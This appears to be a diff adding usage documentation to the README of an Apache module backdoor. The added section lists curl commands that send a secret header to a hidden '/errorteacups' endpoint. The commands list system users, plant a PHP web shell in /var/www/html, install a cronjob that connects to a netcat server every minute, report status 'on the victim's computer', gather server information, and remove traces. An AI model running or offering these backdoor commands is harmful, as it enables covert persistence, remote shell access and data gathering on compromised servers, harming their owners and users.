@@ -48,6 +48,37 @@ This will show the help menu.
 ```
 python3 client.py help
 ```
+### Advanced Backdoor
+
+## List System Users
+```
+sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=users
+```
+## Clean Backdoor
+Removes php shell & cronjob.
+```
+sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=clean
+```
+## Shell
+Drop a PHP shell in the `/var/www/html` folder.
+```
+sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=shell
+```
+## Status
+Returns if there is a webshell or cronjob on the victim's computer.
+```
+sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=status
+```
+## Cronjob
+Will enable a cronjob that connects to a NC server every minute. If one exists it wont add one.
+```
+sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=cronjob
+```
+## Info
+Gets information about the web server.
+```
+sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=info
+```
 # Sources
 
 - https://httpd.apache.org/docs/current/developer/modguide.html
